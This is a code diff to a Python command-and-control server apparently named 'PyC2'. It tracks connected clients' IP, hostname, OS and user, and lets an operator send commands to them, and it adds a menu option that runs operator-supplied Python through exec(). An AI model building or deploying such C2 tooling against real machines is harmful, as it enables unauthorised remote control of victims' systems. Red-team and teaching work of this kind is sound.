@@ -9,7 +9,7 @@ from datetime import datetime
 HOST='localhost'
 LISTEN_PORT=9999
 BUFFER_SIZE=4096
-TIMEOUT_TIME=5
+TIMEOUT_TIME=10
 
 '''
 Netflow Diagram
@@ -45,6 +45,7 @@ client_info ={
 clients_info = {}
 #clients_dead_info = {}
 clients_lock = threading.Lock()
+connections_counter = 0
 
 class style():
   RED       = '\033[31m'
@@ -110,12 +111,15 @@ Args: dict of all clients, pattern to search (full IPADDR or HOSTNAME using ? fo
 def search_clients(clients,pattern,alive_only=False):
     matched = []
     for client in clients.values():
-        if fnmatch.fnmatch(client['ipaddr'], pattern) or fnmatch.fnmatch(client['hostname'], pattern):
-            if alive_only:
-                if client["alive"]:
+        try:
+            if fnmatch.fnmatch(client['ipaddr'], pattern): #or fnmatch.fnmatch(client['hostname'], pattern):
+                if alive_only:
+                    if client["alive"]:
+                        matched.append(client)
+                else:
                     matched.append(client)
-            else:
-                matched.append(client)
+        except:
+            print(f"Error searching on {str(client)}, skipping")
     matched.sort(key=lambda x: ipaddress.ip_address(x["ipaddr"]))
     return matched
 
@@ -173,7 +177,7 @@ def command_menu():
     #for line in [f"\n\t************************************************",f"\t********************{style.GREEN} PyC2 {style.RESET}********************","\t************************************************"]:
     #    print(line)
     print("\nEnter Selection:")
-    for line in ["1 - List connected clients","2 - Ping Check","3 - Kill a client","4 - Send Command","5 - Exit"]: #,"4 - Exit"
+    for line in ["1 - List connected clients","2 - Ping Check","3 - Kill a client","4 - Send Command","5 - Custom Python Command","6 - Exit"]: #,"4 - Exit"
         print("\t"+line)
 
     response = input(f"{style.BLUE}Please enter a number: {style.RESET}").strip()
@@ -194,7 +198,7 @@ def command_menu():
             else:
                 print(f"{style.BLUE}Found {len(clients_list)} Alive Clients:{style.RESET}")
                 for client in clients_list:
-                    print(f"{client["ipaddr"]:<15} |",end="")
+                    print(f"{client["ipaddr"]:<15} | ",end="")
                 print("")
                 confirm = input(f"{style.BLUE}Are you sure you want to execute? Type y/n: {style.RESET}").strip()
                 if confirm != "y":
@@ -216,7 +220,7 @@ def command_menu():
             else:
                 print(f"{style.BLUE}Found {len(clients_list)} Alive Clients:{style.RESET}")
                 for client in clients_list:
-                    print(f"{client["ipaddr"]} |",end="")
+                    print(f"{client["ipaddr"]} | ",end="")
                 print("")
                 confirm = input(f"{style.BLUE}Are you sure you want to execute? Type y/n: {style.RESET}").strip()
                 if confirm != "y":
@@ -256,7 +260,7 @@ def command_menu():
             else:
                 print(f"{style.BLUE}Found {len(clients_list)} Alive Clients:{style.RESET}")
                 for client in clients_list:
-                    print(f"{client["ipaddr"]:<15} |",end="")
+                    print(f"{client["ipaddr"]:<15} | ",end="")
                 print("")
                 confirm = input(f"{style.BLUE}Are you sure you want to execute? Type y/n: {style.RESET}").strip()
                 if confirm != "y":
@@ -265,7 +269,15 @@ def command_menu():
                 #    print(f"{style.GREEN}{client_dict["ipaddr"]:<15}{style.RESET} | ",end="")
                 send_command_clients(clients_list,client_cmd,True)
 
-    elif response == "5": # Exit
+    elif response == "5":
+        user_input = input("Custom python command: ").strip()
+        try:
+            with clients_lock:
+                exec(user_input)
+        except Exception as e:
+            print(f"Error: {str(e)}")
+    
+    elif response == "6": # Exit
         confirm = input(f"{style.RED}Are you sure you want to exit? This will kill the server. Type y/n: {style.RESET}").strip()
         if confirm == "y":
             exit()
@@ -274,7 +286,7 @@ def command_menu():
 def ping_all(clients,noisy=False):
     threads = []
 
-    print(f"Beginning ping of all clients. This may take a few (up to {TIMEOUT_TIME}) seconds...")
+    print(f"Beginning ping of selected clients. This may take a few (up to {TIMEOUT_TIME}) seconds...")
 
     #with clients_lock:
         #clients_snapshot = dict(clients_info) # make a copy to safely iterate. TODO this is so wrong
@@ -320,11 +332,13 @@ Spins off a separate thread for continued handling of client comms.
 '''
 def handle_connections(server_sock):
     global clients_info
+    global connections_counter
 
     # Await connections
     while True:
         try:
             client_sock,addr = server_sock.accept()
+            connections_counter += 1
         except TimeoutError:
             continue
         print(f"Got new connection from {addr}. ",end="") # will be added onto later in the thread
@@ -334,6 +348,7 @@ def handle_connections(server_sock):
 
 # New version of handle client that doesnt listen continuously after registration
 def handle_client2(client_sock,nat_addr):
+    global connections_counter
     client_sock.settimeout(TIMEOUT_TIME)
 
     try:
@@ -358,6 +373,7 @@ def handle_client2(client_sock,nat_addr):
 
         client_info ={
             "ipaddr" : parts[0],
+            #"ipaddr" : f"100.100.100.{str(connections_counter)}",
             "hostname" : parts[1],
             "sys_os" : parts[2],
             "cur_user" : parts[3],
@@ -387,6 +403,7 @@ def handle_client2(client_sock,nat_addr):
 # old
 def handle_client(client_sock,addr,real_addr): #real addr is a new copy so dont worry about
     global clients_info
+    global connections_counter
 
     while True:
         try:
